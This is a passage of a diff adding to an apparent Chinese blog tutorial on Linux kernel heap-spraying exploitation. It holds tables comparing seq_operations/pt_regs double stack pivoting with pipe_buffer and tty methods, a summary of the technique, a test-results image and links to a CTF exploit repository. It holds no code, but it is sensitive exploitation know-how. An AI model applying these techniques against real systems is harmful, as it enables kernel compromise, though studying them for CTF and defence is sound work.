+| **寄存器控制**  | 内联汇编精细控制全部寄存器       | 标准ROP链控制               | 标准ROP链控制          |
+| **CR4修改方式** | 通过pt_regs显式修改              | ROP链中显式修改             | ROP链中显式修改        |
+| **pt_regs利用** | 核心机制                         | 不利用                      | 不利用                 |
+| **触发方式**    | seq_operations->start()调用      | pipe_buffer->ops->release() | tty->ops->ioctl()      |
+| **栈调整**      | 需要较大栈调整(0x168)            | 直接栈翻转                  | 函数调用跳转           |
+| **触发复杂性**  | 高（需精确寄存器设置和偏移计算） | 中                          | 中                     |
+| **灵活性**      | 高（可控制全部寄存器）           | 中                          | 中                     |
+| **可靠性**      | 中（依赖精确偏移计算）           | 高                          | 高                     |
+
+**双重栈迁移与其他方法的对比**：
+
+| 对比维度        | seq_operations方法               | pipe方法        | tty方法         |
+| --------------- | -------------------------------- | --------------- | --------------- |
+| **栈迁移机制**  | 双重迁移: pt_regs + ROP链        | 直接栈翻转      | 函数调用跳转    |
+| **寄存器控制**  | 内联汇编精细控制全部寄存器       | 标准ROP链控制   | 标准ROP链控制   |
+| **CR4修改方式** | 通过pt_regs显式修改              | ROP链中显式修改 | ROP链中显式修改 |
+| **pt_regs利用** | 核心机制                         | 不利用          | 不利用          |
+| **触发复杂性**  | 高（需精确寄存器设置和偏移计算） | 中              | 中              |
+| **灵活性**      | 高（可控制全部寄存器）           | 中              | 中              |
+| **可靠性**      | 中（依赖精确偏移计算）           | 高              | 高              |
+
+**技术演进**：
+
+- 从信息获取到控制流引导的完整链条保持相同
+- 引入pt_regs结构利用，提供新的控制流引导机制
+- 采用双重栈迁移技术，提高控制流引导的可靠性
+- 结合内核配置特性（CR4补丁）调整技术实现
+- 通过内联汇编和直接系统调用提供底层控制
+- 展示了对系统调用机制、内核栈布局和寄存器恢复的深入理解
+
+整个seq_operations操作过程展示了通过精心设计的操作序列，可以在现代内核防护机制下实现从信息获取到控制流引导的完整技术链。pt_regs结构的利用和双重栈迁移技术提供了一种新颖而强大的控制流引导机制，结合寄存器状态的精心设置，实现了对执行流的精确控制。这种方法不仅适用于seq_operations结构，理论上可应用于任何通过系统调用触发的内核对象操作，体现了内核内存操作技术的创新性和可扩展性。
+
+### 7-7. 测试结果
+
+<div style="text-align: center; margin: 2rem 0;">
+  <img src="/images/posts/KernelExploit/HeapSpraying/HeapSpraying_003.png"
+       style="border-radius: 12px; 
+              box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+              max-width: 100%;
+              height: auto;">
+</div>
+
 ## 参考
 
 https://github.com/BinRacer/pwn4kernel/tree/master/src/HeapSpraying
 https://github.com/BinRacer/pwn4kernel/tree/master/src/HeapSpraying2
+https://github.com/BinRacer/pwn4kernel/tree/master/src/HeapSpraying3
 https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#例题：RWCTF2023体验赛-Digging-into-kernel-3
